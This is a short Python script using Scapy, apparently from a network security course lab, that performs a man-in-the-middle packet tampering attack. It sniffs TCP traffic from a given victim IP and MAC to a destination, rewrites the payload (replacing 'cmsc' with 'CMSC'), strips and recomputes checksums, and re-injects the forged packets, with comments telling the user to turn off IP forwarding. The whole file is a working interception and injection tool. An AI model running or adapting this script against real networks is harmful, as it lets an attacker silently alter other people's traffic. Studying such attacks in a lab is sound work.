#!/usr/bin/python3
# ensure that output of 'sysctl net.ipv4.ip_forward'  should be zero.
# set this value to zero by following command. NO SPACE before and after '=' sign.
# sysctl -w net.ipv4.ip_forward=0
# --------------------------------
# the program replaces any occurrent of cmsc with CMSC.
# -------------------------------
import sys
import re
from scapy.all import *

if len(sys.argv) != 4:
  print("Usage: sys.argv[0] <vitim IP> <dstn IP> <victim MAC>")
  exit();

def spoof_pkt(pkt):
  newpkt = IP(bytes(pkt[IP]))
  del(newpkt.chksum)
  del(newpkt.len)
  del(newpkt[TCP].payload)
  del(newpkt[TCP].chksum)
  if pkt[TCP].payload:
    msg = pkt[TCP].payload.load
    newmsg = msg.replace(b'cmsc', b'CMSC')
    spkt = newpkt/newmsg
    send(spkt)
    spkt.show()
  else:
      send(newpkt)
      newpkt.show()

# program has all the 4 params
victim_ip = sys.argv[1]
dstn_ip = sys.argv[2]
victim_mac = sys.argv[3]

template = 'tcp and (ip src {A} and ip dst {B} and ether src {C})'
cap_filter = template.format(A=victim_ip, B=dstn_ip, C=victim_mac)
#print(cap_filter)
pkt = sniff(iface='eth0', filter=cap_filter, prn=spoof_pkt)
